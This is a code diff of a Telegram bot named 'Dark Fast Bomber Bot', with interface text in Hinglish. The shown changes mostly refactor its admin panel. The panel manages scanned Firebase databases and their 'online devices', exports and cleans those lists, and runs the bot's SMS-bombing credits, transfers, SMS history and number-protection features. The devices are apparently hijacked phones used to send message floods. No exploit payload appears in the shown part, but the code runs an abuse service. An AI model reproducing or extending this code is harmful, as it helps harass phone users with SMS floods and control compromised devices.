+        await cq.answer(f"❌ Koi online firebase nahi mila!\n({len(fbs)} total DBs, sab offline hain)", show_alert=True); return
 
     await cq.answer("📥 Generating TXT...")
-
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    lines = []
-    lines.append("=" * 60)
-    lines.append("#  ONLINE FIREBASE REPORT")
-    lines.append("#  Generated by: Dark Fast Bomber Bot")
-    lines.append(f"#  Owner: {OWNER_NAME} ({uid})")
-    lines.append(f"#  Date: {timestamp}")
-    lines.append("=" * 60)
-    lines.append("")
-    lines.append(f"# Total Scanned DBs   : {len(fbs)}")
-    lines.append(f"# Online DBs          : {len(online_fbs)}")
-    lines.append(f"# Offline DBs         : {len(offline_fbs)}")
-    lines.append(f"# Total Online Devices: {len(devices)}")
-    lines.append("")
-    lines.append("=" * 60)
-    lines.append("#  ONLINE FIREBASES (Label | URL | Devices)")
-    lines.append("=" * 60)
-    lines.append("")
+    lines = [
+        "=" * 60,
+        "#  ONLINE FIREBASE REPORT",
+        "#  Generated by: Dark Fast Bomber Bot",
+        f"#  Owner: {OWNER_NAME} ({uid})",
+        f"#  Date: {timestamp}",
+        "=" * 60, "",
+        f"# Total Scanned DBs   : {len(fbs)}",
+        f"# Online DBs          : {len(online_fbs)}",
+        f"# Offline DBs         : {len(offline_fbs)}",
+        f"# Total Online Devices: {len(devices)}",
+        "", "=" * 60,
+        "#  ONLINE FIREBASES (Label | URL | Devices)",
+        "=" * 60, ""]
     for fb, cnt in sorted(online_fbs, key=lambda x: -x[1]):
         label = fb.get("label", fb["url"][:30])
         lines.append(f"{label} | {fb['url']} | devices: {cnt}")
@@ -1659,8 +1763,7 @@ async def owner_fb_export_online(cq: CallbackQuery, state: FSMContext):
         f"{em(EMOJI_FIRE, '🔥')} Online DBs    : <b>{len(online_fbs)}</b>\n"
         f"{em(EMOJI_CROSS, '❌')} Offline DBs   : <b>{len(offline_fbs)}</b>\n"
         f"{em(EMOJI_PHONE, '📱')} Online Devices: <b>{len(devices)}</b>\n\n"
-        f"<i>Sirf Super Admin ye download kar sakta hai.</i>"
-    )
+        f"<i>Sirf Super Admin ye download kar sakta hai.</i>")
     try:
         await cq.message.reply_document(document=FSInputFile(filepath), caption=caption, parse_mode="HTML")
         log_activity(d, "fb_export_online", uid, f"Exported {len(online_fbs)} online DBs")
@@ -1672,39 +1775,34 @@ async def owner_fb_export_online(cq: CallbackQuery, state: FSMContext):
             if os.path.exists(filepath): os.remove(filepath)
         except: pass
 
-# ========== ✅ NEW: Manual Clean Now ==========
+# ========== MANUAL CLEAN ==========
 @R.callback_query(F.data == "owner:fb:clean_now")
 async def owner_fb_clean_now(cq: CallbackQuery, state: FSMContext):
     d = load()
     uid = cq.from_user.id
     if not is_owner(uid, d):
         await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
-
     fbs = d.get("firebases", [])
     if not fbs:
         await cq.answer("❌ Koi firebase nahi!", show_alert=True); return
-
     devices = get_cached_devices()
     online_ids = {dv["fb_id"] for dv in devices}
     to_delete = [fb for fb in fbs if fb["id"] not in online_ids]
-
     if not to_delete:
-        await cq.answer(f"✅ Sab {len(fbs)} DBs online hain!\nKuch delete nahi hoga.", show_alert=True)
-        return
+        await cq.answer(f"✅ Sab {len(fbs)} DBs online hain!\nKuch delete nahi hoga.", show_alert=True); return
 
     preview_lines = []
     for fb in to_delete[:10]:
         preview_lines.append(f"  • <code>{fb.get('label', fb['url'][:20])}</code>")
     preview = "\n".join(preview_lines)
     if len(to_delete) > 10:
-        preview += f"\n  <i>... +{len(to_delete)-10} more</i>"
+        preview += f"\n  <i>+{len(to_delete)-10} more</i>"
 
     await cq.message.edit_text(
         f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Delete {len(to_delete)} Offline DBs?</b>\n\n"
-        f"<i>Ye DBs abhi online nahi hain (0 devices):</i>\n\n"
-        f"{preview}\n\n"
+        f"<i>Ye DBs abhi online nahi hain (0 devices):</i>\n\n{preview}\n\n"
         f"{em(EMOJI_CHECK, '🟢')} Online rahenge: <b>{len(fbs) - len(to_delete)}</b>\n"
-        f"{em(EMOJI_CROSS, '🗑')} Delete honge: <b>{len(to_delete)}</b>",
+        f"{em(EMOJI_TRASH, '🗑')} Delete honge: <b>{len(to_delete)}</b>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [btn("✅ ʏᴇs, ᴅᴇʟᴇᴛᴇ ᴀʟʟ", "owner:fb:clean_do", EMOJI_CHECK, "✅")],
             [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0", EMOJI_CROSS, "❌")]
@@ -1716,36 +1814,28 @@ async def owner_fb_clean_do(cq: CallbackQuery, state: FSMContext):
     uid = cq.from_user.id
     if not is_owner(uid, d):
         await cq.answer("🚫 Sirf Super Admin!", show_alert=True); return
-
     fbs = d.get("firebases", [])
     devices = get_cached_devices()
     online_ids = {dv["fb_id"] for dv in devices}
     to_delete = [fb for fb in fbs if fb["id"] not in online_ids]
-
     if not to_delete:
         await cq.answer("✅ Already clean!", show_alert=True)
         await owner_fb_menu(cq, state); return
-
     d["firebases"] = [fb for fb in fbs if fb["id"] in online_ids]
-
     global CACHED_DEVICES, FB_DEVICE_COUNTS, FB_FAIL_COUNT
     removed_ids = {fb["id"] for fb in to_delete}
     CACHED_DEVICES = [dv for dv in CACHED_DEVICES if dv.get("fb_id") not in removed_ids]
     for rid in removed_ids:
         FB_DEVICE_COUNTS.pop(rid, None)
         FB_FAIL_COUNT.pop(rid, None)
-
     await safe_save(d)
     log_activity(d, "fb_clean_manual", uid, f"Removed {len(to_delete)} offline DBs")
     save(d)
-
     await cq.answer(f"🗑 {len(to_delete)} DBs deleted!", show_alert=True)
     d = load()
     await cq.message.edit_text(
         f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
-        f"✅ Cleanup complete!\n"
-        f"🗑 Removed: <b>{len(to_delete)}</b>\n"
-        f"📊 Total: <b>{len(d.get('firebases', []))}</b>",
+        f"✅ Cleanup complete!\n🗑 Removed: <b>{len(to_delete)}</b>\n📊 Total: <b>{len(d.get('firebases', []))}</b>",
         reply_markup=fb_menu_kb(d, 0), parse_mode="HTML")
 
 @R.callback_query(F.data.startswith("owner:fb:del:"))
@@ -1768,7 +1858,7 @@ async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
         f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
         reply_markup=fb_menu_kb(d, page), parse_mode="HTML")
 
-# ================= OWNER: HOME =================
+# ================= HOME =================
 @R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
 async def owner_home(cq: CallbackQuery, state: FSMContext):
     await state.clear()
@@ -1903,17 +1993,14 @@ async def owner_owners_add_done(msg: Message, state: FSMContext):
     if len(d.get("owners", [])) >= max_o:
         await state.clear()
         await msg.answer(f"❌ Max {max_o}!", reply_markup=owners_menu_kb(d), parse_mode="HTML"); return
-
     if str(new_id) not in d.get("users", {}):
         await state.update_data(pending_owner=new_id)
         await state.set_state(S.add_owner_force)
         await msg.answer(
             f"{em(EMOJI_WARNING, '⚠️')} <b>Ye user ne bot start nahi kiya!</b>\n\n"
-            f"Notification nahi jayega. Force add karein?\n"
-            f"<i>'yes' bhejo ya cancel.</i>",
+            f"Notification nahi jayega. Force add karein?\n<i>'yes' bhejo.</i>",
             reply_markup=kb([(sc('cancel'), "owner:owners:menu")]), parse_mode="HTML")
         return
-
     if new_id in d.get("admins", []): d["admins"].remove(new_id)
     d.setdefault("owners", []).append(new_id)
     d.setdefault("role_meta", {})[str(new_id)] = {
@@ -1971,8 +2058,7 @@ async def owner_owners_del_confirm(cq: CallbackQuery, state: FSMContext):
     u = d.get("users", {}).get(str(del_id), {})
     await cq.message.edit_text(
         f"{em(EMOJI_WARNING, '⚠️')} <b>Confirm Removal?</b>\n\n"
-        f"👑 <code>{del_id}</code>\n👤 {u.get('name', 'Unknown')}\n\n"
-        f"<i>Ye apna owner access kho dega.</i>",
+        f"👑 <code>{del_id}</code>\n👤 {u.get('name', 'Unknown')}\n\n<i>Ye apna owner access kho dega.</i>",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [btn("✅ ʏᴇs, ʀᴇᴍᴏᴠᴇ", f"owner:owners:deldo:{del_id}", EMOJI_CHECK, "✅")],
             [btn("❌ ᴄᴀɴᴄᴇʟ", "owner:owners:menu", EMOJI_CROSS, "❌")]
@@ -2860,15 +2946,13 @@ async def owner_settings(cq: CallbackQuery, state: FSMContext):
         f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>\n"
         f"🛡 Max Admins: <b>{settings.get('max_admins', 20)}</b>\n"
         f"🗑 Auto Cleanup: <b>{auto_status}</b>\n"
-        f"<i>(3 consecutive zero-scans → auto delete)</i>"
-    )
+        f"<i>(3 consecutive zero-scans → auto delete)</i>")
     rows = [
         [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
         [btn("sᴇᴛ ᴍᴀx ᴀᴅᴍɪɴs", "owner:settings:max_admins", EMOJI_SHIELD, "🛡")],
         [InlineKeyboardButton(
             text=f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ: {'🟢 ᴏɴ' if settings.get('auto_cleanup', True) else '🔴 ᴏғғ'}",
-            callback_data="owner:settings:auto_cleanup_toggle"
-        )],
+            callback_data="owner:settings:auto_cleanup_toggle")],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
@@ -2933,24 +3017,19 @@ async def owner_settings_max_admins_done(msg: Message, state: FSMContext):
 async def owner_settings_max_admins_invalid(msg: Message):
     await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number.", parse_mode="HTML")
 
-# ========== ✅ Auto-Cleanup Toggle ==========
 @R.callback_query(F.data == "owner:settings:auto_cleanup_toggle")
 async def owner_settings_auto_cleanup_toggle(cq: CallbackQuery, state: FSMContext):
     d = load()
     if not is_owner(cq.from_user.id, d):
         await cq.answer("🚫 Owner only!", show_alert=True); return
-
     settings = d.setdefault("settings", {})
     current = settings.get("auto_cleanup", True)
     settings["auto_cleanup"] = not current
     await safe_save(d)
-
     global AUTO_CLEANUP_ENABLED
     AUTO_CLEANUP_ENABLED = settings["auto_cleanup"]
-
     status = "🟢 ENABLED" if settings["auto_cleanup"] else "🔴 DISABLED"
     await cq.answer(f"Auto-cleanup: {status}", show_alert=True)
-
     d = load()
     settings = d.get("settings", {})
     auto_status = "🟢 ON" if settings.get("auto_cleanup", True) else "🔴 OFF"
@@ -2960,15 +3039,13 @@ async def owner_settings_auto_cleanup_toggle(cq: CallbackQuery, state: FSMContex
         f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>\n"
         f"🛡 Max Admins: <b>{settings.get('max_admins', 20)}</b>\n"
         f"🗑 Auto Cleanup: <b>{auto_status}</b>\n"
-        f"<i>(3 consecutive zero-scans → auto delete)</i>"
-    )
+        f"<i>(3 consecutive zero-scans → auto delete)</i>")
     rows = [
         [btn("sᴇᴛ ʀᴇғ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
         [btn("sᴇᴛ ᴍᴀx ᴀᴅᴍɪɴs", "owner:settings:max_admins", EMOJI_SHIELD, "🛡")],
         [InlineKeyboardButton(
             text=f"🗑 ᴀᴜᴛᴏ-ᴄʟᴇᴀɴᴜᴘ: {'🟢 ᴏɴ' if settings.get('auto_cleanup', True) else '🔴 ᴏғғ'}",
-            callback_data="owner:settings:auto_cleanup_toggle"
-        )],
+            callback_data="owner:settings:auto_cleanup_toggle")],
         [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
     ]
     await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
@@ -3000,7 +3077,7 @@ async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
     text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal: <b>{total}</b>\n\n<i>Per-user history unke stats me hai.</i>"
     await cq.message.edit_text(text, reply_markup=kb([(sc('back'), "owner:home")]), parse_mode="HTML")
 
-# ================= PROTECT NUMBER =================
+# ================= PROTECT =================
 @R.callback_query(F.data == "owner:protect")
 async def owner_protect_start(cq: CallbackQuery, state: FSMContext):
     d = load()
@@ -3259,8 +3336,7 @@ async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
     await cq.message.edit_text(
         f"{em(EMOJI_MONEY, '💸')} <b>Transfer</b>\n\n"
         f"💰 Your: <b>{cur}</b>\n"
-        f"⚠️ Sirf half transfer kar sakte hain!\n\n"
-        f"Target User ID:",
+        f"⚠️ Sirf half transfer kar sakte hain!\n\nTarget User ID:",
         reply_markup=kb([(sc('cancel'), "user:home")]), parse_mode="HTML")
 
 @R.message(S.transfer_credits_uid, F.text)
@@ -3324,6 +3400,10 @@ async def user_transfer_amount_invalid(msg: Message):
 # ================= MAIN =================
 async def main():
     global PROTECTED_NUMBERS, AUTO_CLEANUP_ENABLED
+
+    # Initialize MongoDB first
+    await init_mongo()
+
     bot = Bot(token=BOT_TOKEN)
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(R)
@@ -3341,21 +3421,22 @@ async def main():
 
     try:
         await bot.send_message(MAIN_OWNER,
-            f"{em(EMOJI_ROCKET, '🚀')} <b>{_VERSION} Online!</b>\n@{me.username}\n"
+            f"{em(EMOJI_DIAMOND, '💎')} <b>{_VERSION} Online!</b>\n@{me.username}\n"
             f"<code>{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</code>\n\n"
             f"👤 Owner: <b>{OWNER_NAME}</b>\n"
             f"🆔 <code>{MAIN_OWNER}</code>\n"
-            f"📢 Log Channel: <code>{LOG_CHANNEL_ID}</code>\n\n"
-            f"✅ All features active:\n"
-            f"• 📥 Online Firebase TXT Export (Super Admin only)\n"
-            f"• 🗑 Auto-Delete Offline (3 scans threshold)\n"
+            f"📢 Log Channel: <code>{LOG_CHANNEL_ID}</code>\n"
+            f"💾 <b>Database:</b> MongoDB (olympic)\n\n"
+            f"✅ <b>All Features Active:</b>\n"
+            f"• 📥 Online Firebase TXT Export\n"
+            f"• 🗑 Auto-Delete Offline (3 scans)\n"
+            f"• ⚠️ Delete All Firebases\n"
             f"• 🗑 Manual Clean Now\n"
             f"• ⚙️ Auto-Cleanup Toggle\n"
-            f"• Role metadata tracking\n"
-            f"• Bulk admin add\n"
-            f"• Safe file writes\n"
-            f"• Non-text crash fix\n"
-            f"• HTTPS-only FB URLs",
+            f"• 💎 Premium icons & layout\n"
+            f"• 💾 MongoDB (olympic db)\n"
+            f"• 🛡 Role metadata tracking\n"
+            f"• 🔒 Safe HTTP-only FB URLs",
             parse_mode="HTML")
     except Exception as e:
         log.warning(f"Owner notify: {e}")
